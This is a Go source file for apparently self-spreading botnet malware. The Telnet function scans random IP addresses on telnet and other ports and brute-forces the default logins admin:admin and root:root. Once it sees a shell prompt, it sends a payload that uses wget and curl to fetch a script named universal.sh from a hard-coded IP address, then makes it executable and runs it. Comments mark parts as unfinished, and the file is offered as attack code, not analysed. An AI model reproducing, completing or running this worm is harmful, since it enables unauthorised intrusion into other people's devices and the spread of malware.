package selfreps

import (
	"math/rand"
	"net"
	"strconv"
	"strings"
	"time"
)

const (
	payload = `wget http://185.246.221.220/universal.sh; chmod 777 universal.sh; ./universal.sh; curl -k -L --output universal.sh http://185.246.221.220/universal.sh; chmod 777 universal.sh; ./universal.s`
)

var (
	ports       = []int{23, 2323, 2002, 80, 1025}
	dialer      = &net.Dialer{Timeout: time.Second * 5}
	credentials = []string{"admin:admin", "root:root"}
	prompts     = []string{"#", "@", "$", ">", "%", "?"}
)

func randomIp() string {
	var octets []string
	octets = append(octets, strconv.Itoa(rand.Intn(255)))
	octets = append(octets, strconv.Itoa(rand.Intn(255)))
	octets = append(octets, strconv.Itoa(rand.Intn(255)))
	octets = append(octets, strconv.Itoa(rand.Intn(255)))

	return strings.Join(octets, ".")
}

func readUntil(conn net.Conn, until string) (success bool, message string) {
	buf := make([]byte, 100)
	conn.SetReadDeadline(time.Now().Add(time.Second * 5))
	_, err := conn.Read(buf)
	if err != nil {
		return false, ""
	}
	return true, string(buf)
}

func Telnet() { // multi thread this for multi ip bruting eventually
	for true {
		ip := randomIp()
		for _, port := range ports {
			ipPort := ip + ":" + strconv.Itoa(port)
			for _, credential := range credentials {
				username := strings.Split(credential, ":")[0]
				password := strings.Split(credential, ":")[1]
				conn, err := dialer.Dial("tcp", ipPort)
				if err != nil {
					continue
				}

				found, _ := readUntil(conn, "ogin:")
				if !found {
					continue
				}
				conn.Write([]byte(username + "\n"))
				found, _ = readUntil(conn, "word:")
				if !found {
					continue
				}
				conn.Write([]byte(password + "\n"))
				buf := make([]byte, 1024)
				_, err = conn.Read(buf)
				if err != nil {
					continue
				}
				readString := string(buf)
				bruted := false
				for _, prompt := range prompts {
					if strings.Contains(readString, prompt) {
						bruted = true
						break
					}
				}
				if !bruted {
					continue
				}
				// now we run payload but how
				conn.Write([]byte(payload + "\n"))
			}

			time.Sleep(time.Second * 5)
		}
	}
}
